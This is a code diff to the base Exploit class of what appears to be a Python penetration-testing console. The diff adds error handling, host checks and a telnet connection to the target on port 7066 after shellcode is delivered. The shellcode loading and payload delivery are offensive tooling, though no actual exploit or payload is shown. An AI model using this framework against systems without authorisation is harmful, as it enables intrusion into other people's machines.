@@ -5,6 +5,8 @@ class Exploit(cmd.Cmd):
     self.prompt = "pdf-console:attack(" + name +")% "
     self.os = __import__("os")
     self.ftplib = __import__("ftplib")
+    self.subprocess = __import__("subprocess")
+    self.sys = __import__("sys")
     _tmp = __import__("random", globals(), locals(), ['randint', 'choice'])
     self.choice = _tmp.choice
     self.randint = _tmp.randint
@@ -13,6 +15,7 @@ class Exploit(cmd.Cmd):
     self.AF_INET = _tmp.AF_INET
     self.SOCK_STREAM = _tmp.SOCK_STREAM
     self.gethostbyname = _tmp.gethostbyname
+    self.config = __import__("config")
     _tmp = __import__("string", globals(), locals(), ['letters'])
     self.letters = _tmp.letters
     self.variables = variables #{"":""}  list of variables
@@ -56,9 +59,19 @@ class Exploit(cmd.Cmd):
     for let in "abcdefghijklmnopqrstuvwxyz":
       if let in self.variables["host"]:
         self.variables["host"] = self.gethostbyname(self.variables["host"])
+    try:
+      self.disconnect(self.connect())
+    except:
+      print "[-]The host could not be reached."
+      return 1
+    return 0
   def get_shellcode(self):
     payload = ""
-    f = open(self.config.cwd + "/payloads/" + self.payload, "r")
+    try:
+      f = open(self.config.cwd + "/payloads/" + self.payload, "r")
+    except:
+      print "[-]File not found: " + self.config.cwd + "/payloads/" + self.payload
+      return 1
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
     f.close()
@@ -68,11 +81,12 @@ class Exploit(cmd.Cmd):
   def deliver(self, payload):
     pass #overwrite this
   def init(self):
-    self.check_host()
+    if self.check_host() != 0:
+      return 1
     print "[*]Generating payload..."
     payload = ""
     return payload
-  def init_deliver(self):
+  def init_deliver(self, payload):
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
   def help_help(self):
@@ -132,6 +146,9 @@ class Exploit(cmd.Cmd):
     print "Usage: start"
     print "start: start the attack"
   def do_start(self, args):
+    if args:
+      print "*** Unknown argument: " + args
+      return
     for v in self.variables.keys():
       if self.variables[v]:
         pass
@@ -139,8 +156,19 @@ class Exploit(cmd.Cmd):
         print "*** Variable not set: " + v
         return
     payload = self.init()
+    if payload == 1:
+      return
     payload = self.generate(payload)
+    if payload == 1:
+      return 
     self.deliver(payload)
     print "[+]Payload sent."
-    print "[*]Connecting..."
-    self.os.system("../../telnet %s 7066" % self.variables["host"]) 
+    print "[*]Attempting to connect..."
+    if self.config.pc == "yes":
+      code = self.subprocess.call(["telnet", self.variables["host"], "7066"], stdin=self.sys.stdin, stdout=self.sys.stdout)
+      if code != 0:
+        print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
+    else:
+      code = self.subprocess.call(["/data/data/com.raveneus.penedroid/files/telnet", self.variables["host"], "7066"], stdin=self.sys.stdin, stdout=self.sys.stdout) 
+      if code != 0:
+        print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
